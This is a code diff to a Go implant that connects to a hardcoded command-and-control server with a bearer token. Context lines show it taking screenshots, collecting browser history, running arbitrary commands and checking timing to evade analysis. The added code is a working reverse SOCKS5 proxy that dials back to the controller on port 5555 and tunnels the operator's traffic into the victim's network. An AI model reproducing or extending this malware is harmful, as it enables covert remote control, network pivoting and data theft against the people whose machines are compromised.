@@ -4,8 +4,10 @@ import (
     "bufio"
     "bytes"
     "crypto/tls"
+    "context"
     "encoding/base64"
     "encoding/json"
+    "encoding/binary"
     "fmt"
     "github.com/kbinani/screenshot"
     "image/png"
@@ -13,6 +15,7 @@ import (
     "log"
     "net"
     "net/http"
+    "net/url"
     "os/exec"
     "os"
     "os/user"
@@ -26,9 +29,15 @@ import (
 )
 
 var (
+    proxyActive   bool
+    proxyStopChan chan struct{}
+    proxyLock     sync.Mutex
+)
+
+var (
     mu               sync.Mutex
     isCommandRunning bool
-    serverURL        = "https://192.168.56.101:5000"
+    serverURL        = "http://192.168.56.101:5000"
     bearerToken      = "Azerty112345678"
 )
 
@@ -245,6 +254,12 @@ func executeCommandAndSendResult(cmd Command) {
         }
     case cmd.Cmd == "browser_history":
         checkBrowserHistories(cmd)
+    case cmd.Cmd == "reverse_proxy_start":
+         go startReverseProxy()
+         sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy started."})
+    case cmd.Cmd == "reverse_proxy_stop":
+         stopReverseProxy()
+         sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy stop signal sent."})
     default:
         executeOtherCommand(cmd)
     }
@@ -669,4 +684,268 @@ func checkTimingAnomaly() bool {
         duration := time.Since(start)
         return duration > 80*time.Millisecond
 }
-       
+
+// handleSOCKS5 implements a minimal SOCKS5 server that resolves domains on the agent.
+// It will handle multiple sequential SOCKS requests over the same TCP connection
+// and uses proper half-close semantics so both sides receive the full response.
+func handleSOCKS5(serverConn net.Conn) {
+    defer func() {
+        _ = serverConn.Close()
+        log.Printf("[*] SOCKS5: connection handler exiting")
+    }()
+
+    // helper to close write side when using net.TCPConn
+    closeWrite := func(c net.Conn) {
+        if tcp, ok := c.(*net.TCPConn); ok {
+            _ = tcp.CloseWrite()
+        } else {
+            _ = c.Close()
+        }
+    }
+
+    // idle timeout between SOCKS handshakes -- increase if you want longer-lived idle connections
+    idleTimeout := 120 * time.Second
+
+    for {
+        // ---- Greeting ----
+        _ = serverConn.SetReadDeadline(time.Now().Add(idleTimeout))
+        header := make([]byte, 2)
+        if _, err := io.ReadFull(serverConn, header); err != nil {
+            if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+                log.Printf("[-] SOCKS5: greeting read timeout/closed: %v", err)
+            } else {
+                log.Printf("[-] SOCKS5: greeting read failed: %v", err)
+            }
+            return
+        }
+        _ = serverConn.SetReadDeadline(time.Time{}) // clear deadline
+
+        if header[0] != 0x05 {
+            log.Printf("[-] SOCKS5: unsupported version %d", header[0])
+            return
+        }
+        nMethods := int(header[1])
+        if nMethods <= 0 || nMethods > 255 {
+            log.Printf("[-] SOCKS5: invalid nMethods %d", nMethods)
+            return
+        }
+        methods := make([]byte, nMethods)
+        if _, err := io.ReadFull(serverConn, methods); err != nil {
+            log.Printf("[-] SOCKS5: reading methods failed: %v", err)
+            return
+        }
+
+        // reply: version 5, no authentication
+        if _, err := serverConn.Write([]byte{0x05, 0x00}); err != nil {
+            log.Printf("[-] SOCKS5: failed to write greeting reply: %v", err)
+            return
+        }
+
+        // ---- Request ----
+        headerReq := make([]byte, 4)
+        if _, err := io.ReadFull(serverConn, headerReq); err != nil {
+            log.Printf("[-] SOCKS5: request header read failed: %v", err)
+            return
+        }
+        if headerReq[0] != 0x05 {
+            log.Printf("[-] SOCKS5: request version mismatch %d", headerReq[0])
+            return
+        }
+        cmd := headerReq[1]
+        addrType := headerReq[3]
+        if cmd != 0x01 {
+            log.Printf("[-] SOCKS5: unsupported command %d", cmd)
+            serverConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+            return
+        }
+
+        var dstHost string
+        var dstPort uint16
+
+        switch addrType {
+        case 0x01: // IPv4
+            addrBuf := make([]byte, 4)
+            if _, err := io.ReadFull(serverConn, addrBuf); err != nil {
+                log.Printf("[-] SOCKS5: failed to read IPv4 addr: %v", err)
+                return
+            }
+            portBuf := make([]byte, 2)
+            if _, err := io.ReadFull(serverConn, portBuf); err != nil {
+                log.Printf("[-] SOCKS5: failed to read port: %v", err)
+                return
+            }
+            ip := net.IPv4(addrBuf[0], addrBuf[1], addrBuf[2], addrBuf[3]).String()
+            port := binary.BigEndian.Uint16(portBuf)
+            dstHost = ip
+            dstPort = port
+
+        case 0x03: // Domain
+            lenBuf := make([]byte, 1)
+            if _, err := io.ReadFull(serverConn, lenBuf); err != nil {
+                log.Printf("[-] SOCKS5: failed to read domain length: %v", err)
+                return
+            }
+            dlen := int(lenBuf[0])
+            if dlen <= 0 || dlen > 255 {
+                log.Printf("[-] SOCKS5: invalid domain length %d", dlen)
+                return
+            }
+            domBuf := make([]byte, dlen+2)
+            if _, err := io.ReadFull(serverConn, domBuf); err != nil {
+                log.Printf("[-] SOCKS5: failed to read domain+port: %v", err)
+                return
+            }
+            domain := string(domBuf[:dlen])
+            port := binary.BigEndian.Uint16(domBuf[dlen : dlen+2])
+
+            // Agent-side DNS resolution: prefer IPv4 then IPv6
+            var chosenIP net.IP
+            ctx := context.Background()
+
+            if ips4, err4 := net.DefaultResolver.LookupIP(ctx, "ip4", domain); err4 == nil && len(ips4) > 0 {
+                for _, ip := range ips4 {
+                    if ip == nil || ip.IsUnspecified() || ip.IsMulticast() {
+                        continue
+                    }
+                    chosenIP = ip
+                    break
+                }
+            }
+
+            if chosenIP == nil {
+                if ips6, err6 := net.DefaultResolver.LookupIP(ctx, "ip6", domain); err6 == nil && len(ips6) > 0 {
+                    for _, ip := range ips6 {
+                        if ip == nil || ip.IsUnspecified() || ip.IsMulticast() {
+                            continue
+                        }
+                        chosenIP = ip
+                        break
+                    }
+                }
+            }
+
+            if chosenIP == nil {
+                log.Printf("[-] SOCKS5: DNS lookup returned no usable IP for %s", domain)
+                serverConn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+                return
+            }
+
+            dstHost = chosenIP.String()
+            dstPort = port
+            log.Printf("[*] SOCKS5: resolved %s -> %s", domain, dstHost)
+
+        default:
+            log.Printf("[-] SOCKS5: unsupported addrType %d", addrType)
+            serverConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+            return
+        }
+
+        // prepare address (use bracketed IPv6 when necessary)
+        var dstAddr string
+        if ip := net.ParseIP(dstHost); ip != nil && ip.To4() == nil {
+            dstAddr = fmt.Sprintf("[%s]:%d", dstHost, dstPort)
+        } else {
+            dstAddr = fmt.Sprintf("%s:%d", dstHost, dstPort)
+        }
+
+        // Connect to target
+        log.Printf("[*] SOCKS5 connect request → %s", dstAddr)
+        targetConn, err := net.DialTimeout("tcp", dstAddr, 15*time.Second)
+        if err != nil {
+            log.Printf("[-] SOCKS5: connect to %s failed: %v", dstAddr, err)
+            serverConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+            // keep serverConn open to accept future requests
+            continue
+        }
+
+        // success reply
+        if _, err := serverConn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}); err != nil {
+            log.Printf("[-] SOCKS5: failed to write success reply: %v", err)
+            targetConn.Close()
+            return
+        }
+        log.Printf("[+] SOCKS5: connected → %s", dstAddr)
+
+        // ---- Relay traffic robustly with proper half-close ----
+        done := make(chan struct{}, 2)
+
+        go func() {
+            _, _ = io.Copy(targetConn, serverConn) // client -> target
+            closeWrite(targetConn)
+            done <- struct{}{}
+        }()
+
+        go func() {
+            _, _ = io.Copy(serverConn, targetConn) // target -> client
+            // do not forcibly close serverConn here; outer defer will close after loop exit if needed
+            done <- struct{}{}
+        }()
+
+        // wait both directions to finish
+        <-done
+        <-done
+
+        log.Printf("[*] SOCKS5: session closed for %s", dstAddr)
+        // loop back and accept next SOCKS handshake on same serverConn
+    }
+}
+
+func startReverseProxy() {
+    proxyLock.Lock()
+    if proxyActive {
+        log.Println("[!]  proxy already active.")
+        proxyLock.Unlock()
+        return
+    }
+    proxyActive = true
+    proxyStopChan = make(chan struct{})
+    proxyLock.Unlock()
+
+    parsed, err := url.Parse(serverURL)
+    if err != nil {
+        log.Printf("[-] proxy: cannot parse serverURL: %v", err)
+        return
+    }
+    host := parsed.Host
+    if strings.Contains(host, ":") {
+        host = strings.Split(host, ":")[0]
+    }
+    remoteAddr := net.JoinHostPort(host, "5555")
+
+    for {
+        select {
+        case <-proxyStopChan:
+            log.Println("[*] proxy: stop signal received.")
+            proxyLock.Lock()
+            proxyActive = false
+            proxyLock.Unlock()
+            log.Println("[+] proxy: stopped.")
+            return
+        default:
+            log.Printf("[*] proxy: connecting to %s ...", remoteAddr)
+            conn, err := net.Dial("tcp", remoteAddr)
+            if err != nil {
+                log.Printf("[-] proxy: failed to connect: %v", err)
+                time.Sleep(5 * time.Second)
+                continue
+            }
+            log.Printf("[+] proxy: connected to %s", remoteAddr)
+            // This handles multiple SOCKS requests for the life of this connection.
+            handleSOCKS5(conn)
+            log.Printf("[*] proxy: session closed, reconnecting...")
+            conn.Close()
+            time.Sleep(2 * time.Second)
+        }
+    }
+}
+
+func stopReverseProxy() {
+    proxyLock.Lock()
+    defer proxyLock.Unlock()
+    if proxyActive && proxyStopChan != nil {
+        close(proxyStopChan)
+    } else {
+        log.Println("[-] proxy: not active.")
+    }
+}
+
